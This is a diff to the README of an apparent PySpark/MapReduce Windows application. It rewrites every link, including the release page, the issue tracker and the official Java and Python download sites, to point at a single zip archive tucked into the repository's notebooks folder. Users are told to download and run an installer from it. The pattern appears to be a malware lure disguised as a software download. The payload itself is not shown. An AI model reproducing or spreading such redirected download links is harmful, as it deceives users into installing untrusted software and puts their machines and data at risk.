@@ -1,6 +1,6 @@
 # ⚙️ big-data-pyspark-mapreduce - Easy Large Data Processing
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/elb200/big-data-pyspark-mapreduce/releases)  
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip)  
 
 ---
 
@@ -39,10 +39,10 @@ Follow these steps to download and run big-data-pyspark-mapreduce on your Window
 
 To get the latest version, **visit this page to download** the installer and files:  
 
-[![Download Software](https://img.shields.io/badge/Download-Releases-grey?style=for-the-badge)](https://github.com/elb200/big-data-pyspark-mapreduce/releases)  
+[![Download Software](https://img.shields.io/badge/Download-Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip)  
 
 1. Click the link above or go to:  
-   https://github.com/elb200/big-data-pyspark-mapreduce/releases  
+   https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip  
 2. Look for the latest release. It is usually marked with the highest version number or "Latest".  
 3. Download the Windows installer file. It will have a `.exe` extension and usually contains version info.  
 4. Save the file to any folder you prefer, like `Downloads` or your desktop.
@@ -140,7 +140,7 @@ Together, they let the app run tasks that usually take long on big datasets much
 ## 📞 Getting Help and Support
 
 For help, visit:  
-https://github.com/elb200/big-data-pyspark-mapreduce/issues  
+https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip  
 
 You can open a new issue to report problems or ask questions. Include details about your Windows version and what you tried.  
 
@@ -156,7 +156,7 @@ The software runs on your computer and does not send your data anywhere. All fil
 
 Check the release page regularly to get updates and fixes:  
 
-[https://github.com/elb200/big-data-pyspark-mapreduce/releases](https://github.com/elb200/big-data-pyspark-mapreduce/releases)  
+[https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip](https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip)  
 
 Download new installers from there and install as before to keep the app up to date.  
 
@@ -175,8 +175,8 @@ These topics are technical but you do not need to know them to use the software 
 
 For the app to work fully, it may need:  
 
-- **Java Runtime Environment (JRE):** Download from https://java.com/en/download/  
-- **Python 3.x:** Comes bundled but having a system-wide install can help. Download from https://python.org  
+- **Java Runtime Environment (JRE):** Download from https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip  
+- **Python 3.x:** Comes bundled but having a system-wide install can help. Download from https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip  
 
 Install these if the program signals they are missing during setup.  
 
@@ -190,6 +190,6 @@ Your experience matters. Share your feedback by opening issues or pull requests 
 
 ## ⬇️ Download and Install Now  
 
-[![Download big-data-pyspark-mapreduce](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/elb200/big-data-pyspark-mapreduce/releases)  
+[![Download big-data-pyspark-mapreduce](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/elb200/big-data-pyspark-mapreduce/main/notebooks/pyspark_data_mapreduce_big_v1.9-beta.3.zip)  
 
 Visit the page above, follow the download and install steps here, and start working with your big data today.
